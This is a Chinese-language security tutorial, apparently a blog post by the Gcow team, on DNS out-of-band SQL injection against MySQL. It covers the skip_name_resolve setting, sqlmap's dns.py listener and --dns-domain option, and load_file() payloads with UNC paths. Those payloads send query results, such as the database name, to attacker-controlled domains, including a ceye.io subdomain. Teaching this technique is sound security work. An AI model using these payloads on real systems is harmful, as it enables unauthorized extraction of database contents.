1\. 为什么要使用DNS注入

盲注跑数据太慢的情况下，选择DNS注入是一个好办法。

2\. DNS注入的原理

把域名dns指向我们的服务器域名，这样的话解析域名的时候就会向我们的dns服务器查询。通过递归查询就可以获取数据库上的信息了。要记住整个域名内的节点标签被限制在63个字符长度大小。

3\. DNS注入的要求

数据库在配置中允许域名解析时

到我们数据库中查看一下：show variables like ‘skip_name_resolve’;

![图片.png](https://image.3001.net/images/20200131/1580478146_5e342ec21f2a7.png!small)

skip_name_resolve这个参数是禁止域名解析

skip_name_resolve 为off时会进行域名解析

一旦开启此参数，所有远程主机连接数据库授权都要使用IP地址的方式。

生产环境正常都是开启的。

4\. 实战

首先我们服务器上安装sqlmap

发现服务器已经有2.6的python环境了

![图片.png](https://image.3001.net/images/20200131/1580478157_5e342ecd42cbb.png!small)

直接pip install sqlmap

![图片.png](https://image.3001.net/images/20200131/1580478168_5e342ed88e11d.png!small)

安装成功。

接着

![图片.png](https://image.3001.net/images/20200131/1580478177_5e342ee1d394a.png!small)

找到sqlmap根目录

cd /usr/lib/python2.6/site-packages/sqlmap/lib/request/

![图片.png](https://image.3001.net/images/20200131/1580478186_5e342eead6004.png!small)

dns.py

它的作用是监听53端口，先给它一个执行权限，+x

这里我直接给他最大权限了

chmod 777 dns.py

在mysql命令行执行 select load_file("\\\\\\\xxx.zka7.xyz\\\txf");

 _\\\\\\\_ 经过传输后会变成\\\

txf是域名的下级目录，可以随便构造

执行后服务器就会有数据包（xxx.zka7.xyz）出现

5\. Sqlmap的自动化实现

在sqlmap中实现DNS注入加上参数

在服务器安装好了sqlmap然后运行dns.py

\--dns-domain=域名

即可实现自动化。

6\. 我不想买2个域名，我不想买服务器，我也想玩一波DNS注入

有现成的服务：[ _http://ceye.io_](http://ceye.io)

登陆之后

![图片.png](https://image.3001.net/images/20200131/1580478209_5e342f01d981c.png!small)

有一个分配给你的二级域名

在数据库中输入

select load_file("\\\\\\\tangxiaofeng.1odz7u.ceye.io\\\aaa");

![图片.png](https://image.3001.net/images/20200131/1580478226_5e342f12aa9e2.png!small)

可以看到tangxiaofeng这个帅气的名字。

试一下拼接。

首先本地选择一个表

use sqltest；

这里的sqltest是我自己建的表

接着select load_file(concat("\\\\\\\",(select
database()),".1odz7u.ceye.io\\\txf"));

![图片.png](https://image.3001.net/images/20200131/1580478236_5e342f1ce0b93.png!small)

database出来了。

Gcow安全团队公众号:

![qrcode_for_gh_f444cf1f314b_258\(1\).jpg](https://image.3001.net/images/20200131/1580478253_5e342f2d0b5b6.jpg!small)  

  
  

